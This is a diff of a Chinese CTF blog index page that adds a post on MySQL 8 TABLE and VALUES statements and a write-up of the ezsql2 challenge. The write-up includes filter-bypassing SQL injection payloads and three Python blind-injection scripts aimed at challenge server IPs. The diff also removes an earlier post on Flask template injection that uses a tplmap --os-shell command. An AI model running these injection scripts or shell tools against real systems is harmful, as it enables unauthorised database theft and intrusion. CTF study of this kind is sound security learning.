@@ -114,7 +114,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 11.43px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/nodejs/" style="font-size: 12.86px;">nodejs</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 12.86px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 11.43px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 12.86px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -171,6 +171,130 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-table语句" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/14/table%E8%AF%AD%E5%8F%A5/" class="article-date">
+  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/14/table%E8%AF%AD%E5%8F%A5/">
+        table语句
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="table语句"><a href="#table语句" class="headerlink" title="table语句"></a>table语句</h1><p>mysql8版本上线了新的特性，就是table语句和VALUES语句</p>
+<h2 id="table语句-1"><a href="#table语句-1" class="headerlink" title="table语句"></a>table语句</h2><p>作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 具体用来在小表的扫描，如：路由表、配置类表、简单映射表等</span><br><span class="line"></span><br><span class="line">2. 用来替换是被当做子查询的这类小表的SELECT语句</span><br></pre></td></tr></table></figure>
+
+<p>具体语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table table_name [order by column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>
+<p>从语法中的order by column_name可以看出，可以排序，也可以过滤记录集</p>
+<h3 id="简单全表扫描"><a href="#简单全表扫描" class="headerlink" title="简单全表扫描"></a>简单全表扫描</h3><p>传统语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from t1;</span><br></pre></td></tr></table></figure>
+
+<p>table语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table t1;</span><br></pre></td></tr></table></figure>
+
+<h2 id="VALUES语句"><a href="#VALUES语句" class="headerlink" title="VALUES语句"></a>VALUES语句</h2><p>作用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用做功能展示或快速造数据场景，结果列名字以column_0开头，以此类推</span><br></pre></td></tr></table></figure>
+
+<h3 id="单条values语句"><a href="#单条values语句" class="headerlink" title="单条values语句"></a>单条values语句</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3);</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1|        2|        3|</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">1 row inset(0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="多条values语句"><a href="#多条values语句" class="headerlink" title="多条values语句"></a>多条values语句</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8);</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="多条-VALUES-联合-UNION-ALL"><a href="#多条-VALUES-联合-UNION-ALL" class="headerlink" title="多条 VALUES 联合 UNION ALL"></a>多条 VALUES 联合 UNION ALL</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9);</span><br></pre></td></tr></table></figure>
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="根据字段下标排序，从1开始的多条values联合union-all-values"><a href="#根据字段下标排序，从1开始的多条values联合union-all-values" class="headerlink" title="根据字段下标排序，从1开始的多条values联合union all values"></a>根据字段下标排序，从1开始的多条values联合union all values</h3><p>语法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">values row(1,2,3),row(10,9,8) union all values \</span><br><span class="line">    row(-1,-2,0),row(10,29,30),row(100,20,-9) order by 1 desc ;</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+----------+----------+</span><br><span class="line">| column_0 | column_1 | column_2 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">|      100 |       20 |       -9 |</span><br><span class="line">|       10 |        9 |        8 |</span><br><span class="line">|       10 |       29 |       30 |</span><br><span class="line">|        1 |        2 |        3 |</span><br><span class="line">|       -1 |       -2 |        0 |</span><br><span class="line">+----------+----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="实例-鹤城杯ezsql2"><a href="#实例-鹤城杯ezsql2" class="headerlink" title="实例(鹤城杯ezsql2)"></a>实例(鹤城杯ezsql2)</h2><p>那时我的想法是使用异或注入，但是发现重要的select被过滤掉了，然后发现mysql版本是8以上，所以可以使用table语句来绕过select过滤</p>
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admn&#x27;||(ascii(substr(database(),1,1))=32)#</span><br></pre></td></tr></table></figure>
+<p>爆出数据库为ctf</p>
+<p>爆数据表，我们知道数据表的信息一般存储在information_schema.tables中，所以我们可以使用table语句来读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/information_schema.tables/**/order/**/by/**/database_name/**/limit/**/1,1)#</span><br></pre></td></tr></table></figure>
+<p>由于infoemation_schema.tables被过滤掉了，所以可以使用mysql.innodb_table_stats来读取数据表的信息，其中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)</span><br></pre></td></tr></table></figure>
+<p>意思是每条列的第一行进行比较，从而爆出ctf库中的数据表有哪些，爆出数据表为f11114g</p>
+<p>爆数据表中的信息，可以利用mysql8新增的特性table语句来构造盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#</span><br></pre></td></tr></table></figure>
+
+
+<p>所以我们可以写exp</p>
+<p>爆数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">pt = &#x27;&#123;&#125;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?&lt;&gt;@!#$%^&amp;*~&#x27;</span><br><span class="line">url=&quot;&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">sql=&quot;user()&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def blindequ(start,end):</span><br><span class="line">    ret=&quot;&quot;</span><br><span class="line">    for i in range(start,end):</span><br><span class="line">        for ch in pt:</span><br><span class="line">            payload=&quot;admn&#x27;||(substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27;)#&quot;.format(sql,i,ch)</span><br><span class="line">            data = &#123;</span><br><span class="line">                &quot;username&quot;:payload,</span><br><span class="line">                &quot;password&quot;:&#x27;a&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            #print data</span><br><span class="line">            #req=requests.post(url,data=data,allow_redirects=False)</span><br><span class="line">            req=requests.post(url+&quot;/login.php&quot;,data=data)</span><br><span class="line">            #print req.text</span><br><span class="line">            #if req.status_code!=200 and req.status_code!=302:</span><br><span class="line">            #    continue </span><br><span class="line">            if  &quot;password error!&quot; in req.text:</span><br><span class="line">                ret=ret+ch</span><br><span class="line">                sys.stdout.write(&quot;[-]&#123;0&#125; Result : -&gt; &#123;1&#125; &lt;-\r&quot;.format(threading.current_thread().name,ret))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                break</span><br><span class="line">    print(threading.current_thread().name+&quot;[+]Result : -&gt;&quot;+ret+&quot;&lt;-&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">blindequ(1,20)</span><br></pre></td></tr></table></figure>
+
+<p>爆数据表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import binascii</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">url = &quot;http://182.116.62.85:26571/login.php&quot;</span><br><span class="line">def trans(a):</span><br><span class="line">    a = binascii.b2a_hex(a.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    return &#x27;0x&#x27;+str(a,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(1,500): </span><br><span class="line">    hexstr = &#x27;&#x27;</span><br><span class="line">    for char in range(32, 126):</span><br><span class="line">        hexstr = trans(flag+ chr(char))</span><br><span class="line">        #fl11aag</span><br><span class="line">        payload = &quot;admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/mysql.innodb_table_stats/**/order/**/by/**/database_name/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        #payload = &quot;admin&#x27;/**/and/**/(&#123;&#125;)=&gt;binary(TABLE/**/ctf.fl11aag/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        datas = &#123;&quot;username&quot;:payload,&quot;password&quot;:&quot;admin&quot;&#125;</span><br><span class="line">        r = req.post(url,data=datas)</span><br><span class="line">        if(&quot;login success&quot; in r.text):</span><br><span class="line">            flag = flag + chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>最后读取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://139.129.98.9:30003/login.php&#x27;</span><br><span class="line">payload = &#x27;admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#&#x27;</span><br><span class="line">passa=&#x27;123&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;username&#x27;: py,&#x27;password&#x27;:passa&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;password&#x27; in re.text:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>参考文章：[<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]">https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]</a></p>
+<pre><code>[https://www.crisprx.top/archives/203]
+
+[https://zhuanlan.zhihu.com/p/116632771]
+</code></pre>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-伪随机数以及文件泄露" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -1071,110 +1195,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-flask模板注入以及arjun和talmap工具运用以及rc4加密" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/06/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aarjun%E5%92%8Ctalmap%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8%E4%BB%A5%E5%8F%8Arc4%E5%8A%A0%E5%AF%86/" class="article-date">
-  	<time datetime="2021-10-05T16:00:00.000Z" itemprop="datePublished">2021-10-06</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/06/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%BB%A5%E5%8F%8Aarjun%E5%92%8Ctalmap%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8%E4%BB%A5%E5%8F%8Arc4%E5%8A%A0%E5%AF%86/">
-        flask模板注入以及arjun和tplmap工具运用以及rc4加密
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="flask模板注入之arjun和tplmap工具的使用"><a href="#flask模板注入之arjun和tplmap工具的使用" class="headerlink" title="flask模板注入之arjun和tplmap工具的使用"></a>flask模板注入之arjun和tplmap工具的使用</h1><p>打开页面，发现页面有显示flask字段，再看题目名称，可以推测是flask注入，但是注入点在哪里呢，找不到，所以我们可以使用arjun工具爆出注入点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 arjun.py -u http://url/ --get -d 5 -t 1</span><br></pre></td></tr></table></figure>
-
-<p>-d 5的作用是请求间隔，如果服务器设置了防ddos，则一定要加-d 5，否则会429，无法爆破出来，最后爆破，结果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Analysing the content of the webpage</span><br><span class="line">Analysing behaviour for a non-existent parameter</span><br><span class="line">Reflections: 0</span><br><span class="line">Response Code: 200</span><br><span class="line">Content Length: 2292</span><br><span class="line">Plain-text Length: 428</span><br><span class="line">Parsing webpage for potential parameters</span><br><span class="line">Performing heuristic level checks</span><br><span class="line">Heuristic found 2 potential parameters.</span><br><span class="line">Scan Completed</span><br><span class="line">Valid parameter found: name</span><br><span class="line">Reason: Different number of reflections</span><br></pre></td></tr></table></figure>
-
-<p>因此，我们可以知道注入点是name，所以我们构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>发现回显</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I ♥ Flask &amp; 49 </span><br></pre></td></tr></table></figure>
-<p>因此，注入点找到，我们可以使用内置类subprocess.Popen类来执行命令，但是这里有个tplmap的工具，可以让我们知道是什么类型的模板注入以及获得shell</p>
-<p>我们可以输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://url/?name=1</span><br></pre></td></tr></table></figure>
-
-<p>即可看到是jinja模板的注入，然后输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tplmap.py -u http://url/?name=1 --os-shell</span><br></pre></td></tr></table></figure>
-<p>即可获得shell，然后直接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br></pre></td></tr></table></figure>
-<p>即可获得flag</p>
-<h1 id="flask模板注入之rc4加密"><a href="#flask模板注入之rc4加密" class="headerlink" title="flask模板注入之rc4加密"></a>flask模板注入之rc4加密</h1><p> 打开页面后，发现是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome To Find Secret</span><br></pre></td></tr></table></figure>
-
-<p>然后查看页面源码以及抓包，也发现不了有用信息，所以我们用dirsearch.py工具扫以下，发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret</span><br></pre></td></tr></table></figure>
-<p>回显出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tell me your secret.I will encrypt it so other can&#x27;t see</span><br></pre></td></tr></table></figure>
-<p>通过这句话，推测要传参，且参数为secret，所以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=1</span><br></pre></td></tr></table></figure>
-<p>发现回显一个字母，所以尝试增长字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/secret?secret=11111111111111111111111</span><br></pre></td></tr></table></figure>
-<p>发现报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError</span><br><span class="line"></span><br><span class="line">UnicodeDecodeError: &#x27;ascii&#x27; codec can&#x27;t decode byte 0xfb in position 4: ordinal not in range(128)</span><br><span class="line">Traceback (most recent call last)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2309, in __call__</span><br><span class="line"></span><br><span class="line">    return self.wsgi_app(environ, start_response)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2295, in wsgi_app</span><br><span class="line"></span><br><span class="line">    response = self.handle_exception(e)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1741, in handle_exception</span><br><span class="line"></span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 2292, in wsgi_app</span><br><span class="line"></span><br><span class="line">    response = self.full_dispatch_request()</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1815, in full_dispatch_request</span><br><span class="line"></span><br><span class="line">    rv = self.handle_user_exception(e)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1718, in handle_user_exception</span><br><span class="line"></span><br><span class="line">    reraise(exc_type, exc_value, tb)</span><br><span class="line"></span><br><span class="line">    File &quot;/usr/local/lib/python2.7/site-packages/flask/app.py&quot;, line 1813, in full_dispatch_request</span><br><span class="line"></span><br><span class="line">    rv = self.dispatch_request()</span><br><span class="line"></span><br><span class="line">    File 